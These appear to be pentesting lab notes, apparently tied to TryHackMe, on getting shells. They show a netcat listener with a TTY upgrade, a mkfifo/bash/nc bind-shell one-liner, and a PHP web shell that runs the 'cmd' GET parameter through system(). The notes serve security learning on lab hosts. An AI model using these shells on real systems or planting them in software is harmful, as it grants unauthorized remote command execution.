# Reverse Shell

First, you need to start a listener on your machine.
For example, using netcat:

```
[ Oguri ~/Desktop ]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Next, execute a reverse shell payload on the target machine you are testing.
You can generate a suitable payload using:

https://www.revshells.com/

Once the payload is executed successfully, you should receive a connection back to your listener.

```
[ Oguri ~/Desktop ]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.81.161.175 37856
$ 
```

At this stage, the shell is usually very limited. To improve it and get a more stable interactive TTY, you can upgrade the shell using techniques described here:

https://0xffsec.com/handbook/shells/full-tty/

Example of upgrading the shell:

```
[ Oguri ~/Desktop ]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.81.161.175 37856
$ ^Z
[1]+  Stopped                    nc -lvnp 4444
[ Oguri ~/Desktop ]$ stty raw -echo && fg
nc -lvnp 4444
```

After this, the shell should behave more like a normal interactive Bash shell.

# Bind Shell

A bind shell opens a listening port on the compromised system. When an attacker connects to this port, the system exposes a shell, allowing the attacker to execute commands remotely.

In this example, a bind shell is created without using nc -e, which is more realistic and commonly used in restricted environments.

```
[ Oguri ~/Desktop ]$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

This setup allows full interactive command execution once a connection is established.

```
[ Oguri ~/Desktop ]$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

After connecting, the attacker gains an interactive shell on the target system.

# Web Shell

A web shell is a script uploaded to a web server that allows an attacker to execute system commands remotely through HTTP requests.

```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

How it works

The script checks if the cmd parameter is present in the HTTP GET request If it exists, the value is passed directly to the system() function The command is executed on the underlying operating system The output is returned in the HTTP response

```
http://files.lookup.thm/rce.php?cmd=id
```

This request executes the id command on the server and returns the result in the browser, confirming remote command execution.

After confirming command execution, attackers usually upgrade access by spawning a reverse shell or bind shell from the web shell.
